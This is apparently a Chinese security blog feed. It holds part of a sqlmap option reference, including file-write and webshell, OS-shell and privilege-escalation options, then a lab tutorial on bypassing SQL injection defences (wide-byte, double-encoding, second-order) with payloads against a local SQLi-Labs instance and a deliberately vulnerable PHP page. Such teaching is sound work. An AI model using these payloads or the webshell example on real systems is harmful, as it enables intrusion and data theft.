Access（访问文件系统）"></a>3.12 File System Access（访问文件系统）</h4><p>这些选项可用于访问后端数据库管理系统的文件系统。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–file-read=RFILE</td><td>读取目标站点的文件。例如<code>--file-read=&quot;/etc/password&quot;</code></td></tr><tr><td>–file-write=WFILE</td><td>写入目标站点的文件（通常与–sql-query联合使用，使用相对路径）。例如<code>--sql-query=&quot;select &quot;一句话木马&quot; --file-write=&quot;shell.php&quot;</code></td></tr><tr><td>–file-dest=DFILE</td><td>同上。使用绝对路径。</td></tr></tbody></table><h4 id="3-13-Operating-System-Access（操作系统连接）"><a href="#3-13-Operating-System-Access（操作系统连接）" class="headerlink" title="3.13 Operating System Access（操作系统连接）"></a>3.13 Operating System Access（操作系统连接）</h4><p>这些选项可用于访问底层操作系统的后端数据库管理系统。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–os-cmd=OSCMD</td><td>执行系统命令。例如<code>--os-shell=&quot;ipconfig -all&quot;</code></td></tr><tr><td>–os-shell</td><td>执行远程系统命令（在目标站点操作系统上的Shell）</td></tr><tr><td>–os-pwn</td><td>同上。获取一个OOB shell、meterpreter、VNC。</td></tr><tr><td>–os-smbrelay</td><td>同上。一键获取获取一个OOB shell、meterpreter、VNC。</td></tr><tr><td>–os-bof</td><td>利用缓冲区溢出。</td></tr><tr><td>–priv-esc</td><td>自动提权。</td></tr><tr><td>–msf-path=MSFPATH</td><td>查看Metasploit Framework本地的安装路径。</td></tr><tr><td>–tmp-path=TMPPATH</td><td>远程临时文件目录的绝对路径</td></tr></tbody></table><h4 id="3-14-Windows-Registry-Access（Windows注册表连接）"><a href="#3-14-Windows-Registry-Access（Windows注册表连接）" class="headerlink" title="3.14 Windows Registry Access（Windows注册表连接）"></a>3.14 Windows Registry Access（Windows注册表连接）</h4><p>这些选项可用于访问后端数据库管理系统的Windows注册表。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–reg-read</td><td>读取一个Windows注册表</td></tr><tr><td>–reg-add</td><td>添加一个Windows注册表</td></tr><tr><td>–reg-del</td><td>删除一个Windows注册表</td></tr><tr><td>–reg-key=REGKEY</td><td>与–reg-add连用，注册表key值</td></tr><tr><td>–reg-value=REGVAL</td><td>与–reg-add连用，注册表值</td></tr><tr><td>–reg-data=REGDATA</td><td>与–reg-add连用，注册表数据</td></tr><tr><td>–reg-type=REGTYPE</td><td>与–reg-add连用，注册表类别</td></tr></tbody></table><h4 id="3-15-General（通用）"><a href="#3-15-General（通用）" class="headerlink" title="3.15 General（通用）"></a>3.15 General（通用）</h4><p>这些选项可用于设置一些常规的测试参数。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-s SESSIONFILE</td><td>从一个文件加载保存的session</td></tr><tr><td>-t TRAFFICFILE</td><td>记录流文件的保存位置</td></tr><tr><td><strong>–batch</strong></td><td><strong>批处理。在检测过程中有一些咨询问题，使用默认值答复。</strong></td></tr><tr><td>–binary-fields=..</td><td>指定二进制结果的字段</td></tr><tr><td>–check-internet</td><td>在评估目标之前检查互联网连接</td></tr><tr><td>–crawl=CRAWLDEPTH</td><td>初始位置爬虫的深度。例如<code>--crawl=3</code></td></tr><tr><td>–crawl-exclude=..</td><td>全部页面爬取除了…。例如<code>--crawl-exclude=&quot;test.com/logout.php&quot;</code></td></tr><tr><td>–csv-del=CSVDEL</td><td>指定在CSV输出中使用的分隔字符</td></tr><tr><td>–charset=CHARSET</td><td>强制字符串编码。例如<code>--charset=gbk</code></td></tr><tr><td>–dump-format=DU..</td><td>转存数据的格式。（默认CSV、HTML、SQLITE三种格式）</td></tr><tr><td>–encoding=ENCOD..</td><td>用于数据检索的字符编码。</td></tr><tr><td>–eta</td><td>显示每个输出的预计到达时间</td></tr><tr><td><strong>–flush-session</strong></td><td><strong>清空会话信息</strong></td></tr><tr><td>–forms</td><td>在目标URL上解析和测试表单</td></tr><tr><td><strong>–fresh-queries</strong></td><td><strong>SQLMAP每次将查询结果存在.sqlmap文件夹中，若下次有相同的查询则直接调用上次的结果。使用这个参数忽略之前查询结果</strong></td></tr><tr><td>–har=HARFILE</td><td>将HTTP流量记录在一个HAR文件</td></tr><tr><td>–hex</td><td>DUMP非ASCII字符时，将其编码为16进制，收到后解码环境。</td></tr><tr><td>–output-dir=OUT..</td><td>输出结果至文件。例如<code>--ouput-dir=/tmp</code></td></tr><tr><td>–parse-errors</td><td>解析并显示报错文件</td></tr><tr><td>–save=SAVECONFIG</td><td>过滤信息</td></tr><tr><td>–scope=SCOPE</td><td></td></tr><tr><td>–test-filter=TE..</td><td></td></tr><tr><td>–test-skip=TEST..</td><td></td></tr><tr><td>–update</td><td>检查更新SQLMAP</td></tr></tbody></table><h4 id="3-16-Miscellaneous（杂项）"><a href="#3-16-Miscellaneous（杂项）" class="headerlink" title="3.16 Miscellaneous（杂项）"></a>3.16 Miscellaneous（杂项）</h4><p>这些选项可用于不适合上述任何类别的一些杂项。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-z MNEMONICS</td><td>参数助记符，类似于alias。例如<code>-z &quot;abc&quot;</code></td></tr><tr><td>–alert=ALERT</td><td>找到SQL注入时运行主机OS命令。</td></tr><tr><td>–answers=ANSWERS</td><td>设置问题答案。在<code>--batch</code>选择的是默认值，可以使用参数对特定问题设定特定答案。例如<code>--answer &quot;extending=N&quot;</code>。</td></tr><tr><td>–beep</td><td>在SQL注入被发现时发出嘟嘟声。</td></tr><tr><td>–cleanup</td><td>从SQLMAP特定的UDF和表中找数据库。（暴力破解）</td></tr><tr><td>–dependencies</td><td>检查缺少的SQL映射依赖项。</td></tr><tr><td>–disable-coloring</td><td>禁止输出着色。</td></tr><tr><td>–gpage=GOOGLEPAGE</td><td></td></tr><tr><td>–identify-waf</td><td>识别目标的WAF机制</td></tr><tr><td>–mobile</td><td>模拟手机</td></tr><tr><td>–offline</td><td>离线运行</td></tr><tr><td><strong>–purge-output</strong></td><td><strong>删除所有保存的数据文件夹</strong></td></tr><tr><td>–skip-waf</td><td>跳过WAF/IPS/IDS保护的启发式检测</td></tr><tr><td>–smart</td><td>当有大量检测目标时，只选择基于错误的检测</td></tr><tr><td>–sqlmap-shell</td><td>打开交互式的SQLMAP-Shell</td></tr><tr><td>–tmp-dir=TMPDIR</td><td>更改临时存储文件的本地目录</td></tr><tr><td>–web-root=WEBROOT</td><td>设置Web服务器文档根目录。例如<code>--web-root=&quot;/var/www&quot;</code></td></tr><tr><td>–wizard</td><td>新手教程（挺有趣）</td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> 工具说明书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="2020/03/30/%E6%B5%8B%E8%AF%95/"/>
      <url>2020/03/30/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>包括音乐框、建站时长、阅读时长。。。。懒得写qwq</p>]]></content>
      
      
      <categories>
          
          <category> 测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】四、SQL注入防御绕过</title>
      <link href="2020/03/28/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87/"/>
      <url>2020/03/28/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>本文学习如何绕过开发者对SQL注入设置的防御机制，主要是通过宽字节、二次编码、二次注入、绕过WAF等方法来突破防御机制。从每种方法的原理、方法讲解，到利用Sqli-Labs模拟环境来实战。</p><a id="more"></a><h2 id="一、宽字节注入"><a href="#一、宽字节注入" class="headerlink" title="一、宽字节注入"></a>一、宽字节注入</h2><h4 id="1-1宽字节注入原理"><a href="#1-1宽字节注入原理" class="headerlink" title="1.1宽字节注入原理"></a>1.1宽字节注入原理</h4><blockquote><p>宽字节：两个字节  例如 GBK、GB2312。（uft-8不是宽字节）</p></blockquote><p>安全防御者为了应对SQL注入，因此在<code>*</code>前面加入<code>\</code>使其转义。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd62p3g4zgj31hm0py7km.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd62p3g4zgj31hm0py7km.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200325124335984"></p><h4 id="1-2宽字节注入方法"><a href="#1-2宽字节注入方法" class="headerlink" title="1.2宽字节注入方法"></a>1.2宽字节注入方法</h4><p>在注入点后键入<code>%df</code>，然后按照正常的注入流程开始注入。</p><blockquote><p>黑盒测试：</p><ol><li>在可能的注入点后键入<code>%df</code>，之后进行注入测试</li></ol><p>白盒测试：</p><ol><li>查看MySQL编码是否为GBK</li><li>是否使用preg_replace()把单引号替换成<code>\&#39;</code></li><li>是否使用addslashes进行转义</li><li>是否使用mysql_real_escape_string进行转义</li></ol></blockquote><h4 id="1-3实战-SQLi-Labs-Less-32-白盒测试第二点"><a href="#1-3实战-SQLi-Labs-Less-32-白盒测试第二点" class="headerlink" title="1.3实战 SQLi-Labs Less-32 白盒测试第二点"></a>1.3实战 SQLi-Labs Less-32 白盒测试第二点</h4><p>查看Less-32源码</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd77s9q62jj31h80hw7wi.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd77s9q62jj31h80hw7wi.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326122514598"> </p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd77td9llij31c60u07wk.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd77td9llij31c60u07wk.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326122617786"></p><p>测试注入点</p><p>Payload: <a href="http://127.0.0.1:8999/Less-32/?id=1%EF%BF%BD&#39;">http://127.0.0.1:8999/Less-32/?id=1%df&#39;</a></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd77x30jptj31ms0ooats.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd77x30jptj31ms0ooats.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326122952092"></p><p>判断数据表列数</p><p>Payload: <a href="http://127.0.0.1:8999/Less-32/?id=1%EF%BF%BD&#39;">http://127.0.0.1:8999/Less-32/?id=1%df&#39;</a> order by 4–+</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd780iuhb8j31mo0owwwg.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd780iuhb8j31mo0owwwg.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326123310557"></p><p>union注入测试</p><p>Payload:  <a href="http://127.0.0.1:8999/Less-32/?id=-1%EF%BF%BD&#39;">http://127.0.0.1:8999/Less-32/?id=-1%df&#39;</a> union select 2,3,4–+</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd782fo65cj31mm0fytc2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd782fo65cj31mm0fytc2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326123501410"></p><p>查询数据库<code>SECURITY</code>中的数据表</p><p>Payload: <a href="http://127.0.0.1:8999/Less-32/?id=-1%EF%BF%BD&#39;">http://127.0.0.1:8999/Less-32/?id=-1%df&#39;</a> union select 2,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),4–+</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd78l1e9a9j31me0iu19y.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd78l1e9a9j31me0iu19y.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326125253901"></p><h4 id="1-4实战-SQLi-Labs-Less-33-白盒测试第三点"><a href="#1-4实战-SQLi-Labs-Less-33-白盒测试第三点" class="headerlink" title="1.4实战 SQLi-Labs Less-33 白盒测试第三点"></a>1.4实战 SQLi-Labs Less-33 白盒测试第三点</h4><p>查看源代码</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd78v5bcn4j31g60gy4qq.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd78v5bcn4j31g60gy4qq.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326130236841"></p><blockquote><p>addslashes() 函数返回在预定义的字符（<code>&#39;</code>、<code>&quot;</code>、<code>\</code>和NULL）前添加反斜杠的字符串。</p></blockquote><h4 id="1-5-宽字节防御"><a href="#1-5-宽字节防御" class="headerlink" title="1.5 宽字节防御"></a>1.5 宽字节防御</h4><ol><li><strong>使用UTF-8，避免宽字节注入</strong>（韩文、日语都是宽字节，都可能存在宽字节注入）</li><li><strong>mysql_real_escape_string</strong>（设置mysql_set_charset(‘gbk’,$conn);）</li><li><strong>设置MySQL的连接参数</strong>（character_set_client=binary）<img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7d8pl4kjj312a06eh24.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7d8pl4kjj312a06eh24.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326153402997"></li></ol><h2 id="二、二次编码注入"><a href="#二、二次编码注入" class="headerlink" title="二、二次编码注入"></a>二、二次编码注入</h2><h4 id="2-1二次编码注入原理"><a href="#2-1二次编码注入原理" class="headerlink" title="2.1二次编码注入原理"></a>2.1二次编码注入原理</h4><p>urldecode()与PHP本身处理编码时，两者配合失误，可构造数据消灭<code>\</code>。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7dimcirmj31hi0oinfa.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7dimcirmj31hi0oinfa.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326154334059"></p><h4 id="2-2二次编码注入方法"><a href="#2-2二次编码注入方法" class="headerlink" title="2.2二次编码注入方法"></a>2.2二次编码注入方法</h4><p>在注入点后键入<code>%2527</code>，然后按照正常的注入流程开始注入。</p><blockquote><p>黑盒测试：</p><ol><li>在可能的注入点后键入<code>%2527</code>，之后进行注入测试</li></ol><p>白盒测试：</p><ol><li>是否使用urldecode()函数</li><li>urldecode()函数是否在转义方法之后使用</li></ol></blockquote><h4 id="2-3实战-SQLi-Labs-Less-0"><a href="#2-3实战-SQLi-Labs-Less-0" class="headerlink" title="2.3实战 SQLi-Labs Less-0"></a>2.3实战 SQLi-Labs Less-0</h4><p>SQLi-Labs内无此类型的题目，因此自行构造Less-0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;mysql_real_escape_string:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$id</span> = urldecode(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;urldecode:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常输入–&gt;不能够进行注入</p><p>Payload: http:127.0.0.1:8999/Less-0/?id=1’ </p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7dsutnjsj31mi0gedib.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7dsutnjsj31mi0gedib.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326155324324"></p><p>构造二次编码环境</p><p>Payload: http:127.0.0.1:8999/Less-0/?id=1%2527</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7dtz3w4lj31mi0gidja.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7dtz3w4lj31mi0gidja.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326155429170"></p><p>判断数据表列数</p><p>Payload: http:127.0.0.1:8999/Less-0/?id=1%2527 order by 4–+</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7dyaj3buj31mi0f0775.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7dyaj3buj31mi0f0775.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326155838024"></p><p>union注入测试</p><p>Payload: http:127.0.0.1:8999/Less-0/?id=-1%2527 union select 1,2,3–+</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7dzkgjs1j31m80fkn01.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7dzkgjs1j31m80fkn01.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326155951455"></p><p>查询数据库<code>SECURITY</code>中的数据表</p><p>Payload: http:127.0.0.1:8999/Less-0/?id=-1%2527 union select 2,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),4–+</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7e0q0sd0j31mu0j6n2g.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7e0q0sd0j31mu0j6n2g.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326160058056"></p><h2 id="三、二次注入"><a href="#三、二次注入" class="headerlink" title="三、二次注入"></a>三、二次注入</h2><h4 id="3-1二次注入原理"><a href="#3-1二次注入原理" class="headerlink" title="3.1二次注入原理"></a>3.1二次注入原理</h4><p><strong>第一步：插入恶意数据</strong></p><p>在第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容。</p><p><strong>第二步：引用恶意数据</strong></p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下次需要进行查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验和处理，这就造成了SQL的二次注入。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7e9v8euyj30vw0nmtlv.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7e9v8euyj30vw0nmtlv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326160945233"></p><h4 id="3-2二次注入方法"><a href="#3-2二次注入方法" class="headerlink" title="3.2二次注入方法"></a>3.2二次注入方法</h4><h4 id="3-3实战-SQLi-Labs-Less-24"><a href="#3-3实战-SQLi-Labs-Less-24" class="headerlink" title="3.3实战 SQLi-Labs Less-24"></a>3.3实战 SQLi-Labs Less-24</h4><p>插入新用户（账号为<code>admin&#39;#</code> 密码为<code>123</code>）</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7k62ap52j30yu0u0e82.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7k62ap52j30yu0u0e82.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326193331683"></p><p>分析logged-in.php和pass_change.php源代码 </p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7k8q54unj319y0u0e84.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7k8q54unj319y0u0e84.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326193612478"></p><p>修改刚才创建的<code>admin&#39;#</code>的密码</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7kb80ve2j31lq0oeadb.jpg" 